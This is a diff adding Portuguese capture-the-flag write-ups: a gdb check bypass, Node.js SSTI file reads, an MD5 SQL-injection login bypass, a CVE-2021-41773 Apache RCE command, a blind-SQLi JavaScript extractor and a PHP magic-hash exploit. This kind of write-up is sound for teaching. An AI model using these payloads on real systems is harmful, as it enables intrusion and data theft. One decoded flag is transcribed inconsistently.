@@ -415,39 +415,265 @@ E obtive com isso o código abaixo
 
 ![Reverse02](/reverse/rev2/002.png)
 
-Foi possível perceber que se eu setasse o valor da variável %eax% para 0
+Foi possível perceber que se eu setasse o valor da variável %eax% (em `179c`) para 0 durante a execução desse código utilizando a ferramenta gdb, a flag seria printada independentemente da senha informada, para isso basta executar o comando abaixo
+
+```shell
+gdb
+file rev_02.elf
+break *0x000055555555579c
+run
+set $eax=0x00
+continue
+```
+
+E por fim a flag é printada => `flag{g3tT1nG_H4rdEr}`
+
 
 ## Web Application :globe_with_meridians: ##
 
 ### Lorem Ipsum ###
 
-Lorem ipsum
+Esse desafio nos trazia o endereço https://zup-loremipsu.chals.io que direcionava a uma página html simples, ao inspecionar seu conteúdo foi possível ver um comentário contendo o código morse abaixo:
+
+```html
+<!-- â€“â€“         
+                    -..-. -- ----- .-. ..... ...-- -.-. ----- -.. ...-- .-.-.- - -..- -
+                â€“â€“-->
+```
+
+Que, após decodificado gerava a string `/M0R53C0D3.TXT`. Bastou então acessar o endereço https://zup-loremipsu.chals.io/M0R53C0D3.TXT e achar a flag, que estava em base64 e após decodificada retornava a flag => `ZUP-CTF{m0r53_c0d3}`
 
 ### SSTI ###
 
-Lorem ipsum
+Esse desafio nos dava uma dica muito importante em seu nome, SSTI é um acrônimo para Server Side Template Injection, injeção de código em engines de template. Ao acessar a url https://zup-ssti.chals.io/ foi possível ver o html abaixo
+
+```html
+Hello undefined
+```
+
+E de posse de mais uma informação importante analisando os headers de retorno do servidor, que foi o header `X-Powered-By: Express` foi possível identificar que o SSTI seria em um código NodeJS. Certamente haveria algum parâmetro de entrada para que pudéssemos explorar a falha, tento então utilizar o query string `name` para
+verificar se era essa a nossa entrada e para a minha felicidade vejo surtir o efeito esperado quando o html abaixo é retornado
+
+https://zup-ssti.chals.io/?name='Leo'
+
+```html
+Hello Leo
+```
+
+Após algumas pesquisas cheguei nas chamadas abaixo
+
+```shell
+curl -g "https://zup-ssti.chals.io/?name={{require('fs').readdirSync('.')}}"
+curl -g "https://zup-ssti.chals.io/?name={{require('fs').readFileSync('key.txt')}}"
+```
+
+Para obter, respectivamente, os retornos abaixo
+
+```shell
+Hello .git,Dockerfile,app.js,key.txt,node_modules,package-lock.json,package.json
+
+Hello ZUP-CTF{W3b_pr0_Pr0cton}
+```
+
+E com isso conseguir a flag => `ZUP-CTF{W3b_pr0_Pr0cton}`
 
 ### Login ###
 
-Lorem ipsum
+Esse desafio nos apresentava a url http://18.228.46.98:10010/ e um formulário solicitando que fosse feito login como admin
 
-### SSTI ###
+![Reverse01](/web/login/001.png)
 
-Lorem ipsum
+Ao inspecionar melhor a resposta do servidor através do comando abaixo
+
+```shell
+curl -v http://18.228.46.98:10010/ 
+```
+
+Foi possível verificar uma diretiva `Set-Cookie` indicando o que provavelmente seria o select utilizado por trás do login
+
+```shell
+Set-Cookie:hint=select+*+from+users+where+username='admin'+and+password='md5($password,+true)'
+```
+
+Percebo que a string admin estava fixa e apenas a senha poderia ser alvo de injeção, porém esse input estava sendo convertido para md5 antes de que pudéssemos fazer qualquer tentativa de SQL Injection.
+Após alguma pesquisa, no entanto, descubro que existe uma forma de ainda assim explorar esse código, pois o hash é enviado em binário para o db, e nesse caso precisamos encontrar um hash que, por exemplo, gere um output que contenha a string '='.
+Utilizei para isso o script python disponível neste repositório https://github.com/seunghunoh57/SQL-Injection e com ele cheguei até o request abaixo
+
+```shell
+curl -v 'http://18.228.46.98:10010/' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=admin&password=672847409875712733984791290'
+```
+
+E agora sim temos a nossa flag numa diretiva de cookie
+
+```shell
+Set-Cookie: flag=ZUP-CTF%7Br1ck_54nch3z%7D
+```
+
+A flag era => `ZUP-CTF{Br1ck_54nch3z}`
 
 ### Mayday! AH-64 down! ###
 
-Lorem ipsum
+Esse desafio nos dava a url https://zup-vuln.chals.io/, que direciona para a página default de um servidor Apache, analisando seu retorno é possível descobrir a exata versão em execução através do comando abaixo
+
+```shell
+curl -i https://zup-vuln.chals.io/
+```
+
+O que nos retorna
+
+```shell
+HTTP/1.1 200 OK
+Date: Fri, 03 Dec 2021 13:38:52 GMT
+Server: Apache/2.4.49 (Unix)
+Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
+ETag: "2d-432a5e4a73a80"
+Accept-Ranges: bytes
+Content-Length: 45
+Content-Type: text/html
+
+<html><body><h1>It works!</h1></body></html>
+
+```
+
+
+De posse da informação que a versão era a 2.4.49 bastou procurar por alguma vulnerabilidade relacionada a essa versão e cheguei ao CVE `CVE-2021-41773`, que permitiria exploração de RCE. Após essa conclusão e alguma navegação nos diretórios do servidor cheguei no código abaixo que revelou a flag
+
+```shell
+curl 'https://zup-vuln.chals.io//cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; cat ../../../../../home/www-data/flag.txt'
+
+```
+
+A flag era => `CTF-ZUP{@p4ch3httpd2449cv3202141773fl@g}`
+
 
 ### Blind ###
 
-Lorem ipsum
+Esse desafio nos apresentava a url https://zup-blind.chals.io/?id=2 e dizia que o admin havia esquecido sua senha. A maior dica aqui estava no nome do desafio,
+blind, que remetia a Blind sql injection, que se trata de uma vulnerablidade onde podemos sim explorar comandos sql, porém sem ter o retorno dessa execução de forma explícita.
+Ao alterar o query string id incluindo uma aspas simples é possível validar que se trata mesmo de sql injection conforme o código abaixo
+
+```shell
+curl "https://zup-blind.chals.io/?id=2'"
+```
+
+Que nos retornava
+
+```shell
+Traceback (most recent call last):
+  File "/source/blinSql.py", line 41, in do_GET
+    cursor.execute("SELECT id, username, name, surname FROM users WHERE id=" + params["id"])
+sqlite3.OperationalError: unrecognized token: "'"
+```
+
+Aparentemente a consulta estava vulnerável a SQL Injection, tentei então tornar o desafio um pouco mais fácil e fazer com que, através de um UNION, conseguisse
+retornar uma consulta SQL arbitrária, que no caso retornaria a senha no lugar do nome, por exemplo
+
+```shell
+curl "https://zup-blind.chals.io/?id=2+union+all+select+name,password,3,4+from+users"
+```
+
+Porém haviam premeditado meus movimentos :( e o retorno foi
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>
+<title>Zup Red Team 2021</title>
+</head>
+<body style='font: 12px monospace'>
+
+Not this way!
+```
+
+Após isso tento então atualizar o nome de algum usuário para inserir num lugar que eu poderia ver, a informação que quisesse do banco. Para isso tentei o script abaixo
+
+```shell
+curl "https://zup-blind.chals.io/?id=2;+update+users+set+name=(select+password+from+users+where+name=+'admin')+where+name='admin'"
+```
+
+Minha intenção com esse script era setar no lugar do nome do admin a sua senha, e se fosse possível então bastaria atualizar a página e eu veria sua senha. No entanto não estava habilitado no servidor a execução de múltiplas instruções SQL conforme o retorno abaixo
+
+```bash
+Traceback (most recent call last):
+  File "/source/blinSql.py", line 41, in do_GET
+    cursor.execute("SELECT id, username, name, surname FROM users WHERE id=" + params["id"])
+sqlite3.Warning: You can only execute one statement at a time.
+```
+
+Ok, então teria que ser realmente blind, ou seja, teria que inferir a senha após alguns scripts executados. Para chegar nesse resultado fiz um javascript, mas
+primeiro tive que descobrir qual o tamanho da senha do usuário admin, e para isso fiz alguns requests como o abaixo
+
+```
+https://zup-blind.chals.io/?id=1 and (select length(password) from users where id = 1 ) > {n}
+```
+
+Substituindo n pelo tamanho que queria descobrir, até chegar na conclusão que a senha tinha 24 caracteres, pois no momento que executei o request conforme abaixo
+
+```
+https://zup-blind.chals.io/?id=1 and (select length(password) from users where id = 1 ) > 23
+```
+
+o usuário Admin deixou de ser retornado. De posse dessa informação fiz o script abaixo
+
+```javascript
+var s = Array.from({length: 95}, (_, i) => i + 32); //all ascii chars
+
+var length = 24; //pass length
+var password = [];
+
+
+async function findWholePass() {
+    for(var i = 0; i < length; i++) {
+        password[i] = await findOutLetterAt(i);
+    }
+}
+
+function findOutLetterAt(i) {
+  return Promise.all(s.map(s => tryChar(s,i))).then(all => all.find(r => r.exists));
+}
+
+function tryChar(c, p) {
+    return fetch(`https://zup-blind.chals.io/?id=1 and (select substr(password,${p + 1},1) from users where id = 1 ) = char(${c}) `).then(r => r.text()).then(r => ( {letter : String.fromCharCode(c), exists: r.includes('<td>admin</td>') }) );
+}
+
+```
+
+e executando via console do chrome mesmo foi possível, letra a leta (da 1 até a 24) testar todas as opções da tabela ascii para verificar qual seria exatamente a
+senha do admin, diferenciando responses onde o admin era retornado na listagem de responses que ele não era. Caso a execução da query retornasse o usuário admin, significaria que a letra testada naquela posição seria a certa, e após alguns minutos é possível obter a senha, que também é a flag => `ZUP-CTF{4tt4ck 0n T1t4N}`
+
+Certamente teria como ter feito algo muito mais fácil e performático, mas foi um processo um tanto divertido fazer na mão xD
+
 
 ### Welcome to the Juggling ###
 
-Lorem ipsum
+Esse desafio nos dava a url https://zup-type.chals.io/ que exibia um código em php
 
+![Juggling](/web/juggling/001.png)
 
+E tinha uma vulnerabilidade conhecida como Magic Hash, onde no PHP caso sejam comparados dois valores utilizando o `==` e especificamente no caso de hex, caso
+o hex comece com `0e...` ele sempre será igual à string `"0"`. Para gerar uma entrada que fizesse um magic hash fiz o script abaixo, também em php, 
+
+```php
+<?php
+
+do {
+    $secret = 'Zup_CTF_2021';
+    $rand = substr(md5(microtime()),rand(0,26),8);
+    $m = substr($rand,0,8);
+    $h = substr(md5($secret . $m), 0, 4);
+}while($h != '0');
+echo 'Hash was: ' . $h . ' For rand: ' . $rand;
+```
+
+Ao executá-lo ele sempre retorna uma entrada válida, como por exemplo `fa6ba80a` que gera a hash `0e67`
+E após ter uma entrada válida bastou executar o comando abaixo
+
+```shell
+curl "https://zup-type.chals.io/?a=fa6ba80a&b=0"
+```
+
+Para obter a nossa flag => `ZUP-{C0d3 G3ass}`
 
 
 # Ferramentas :hammer: # 
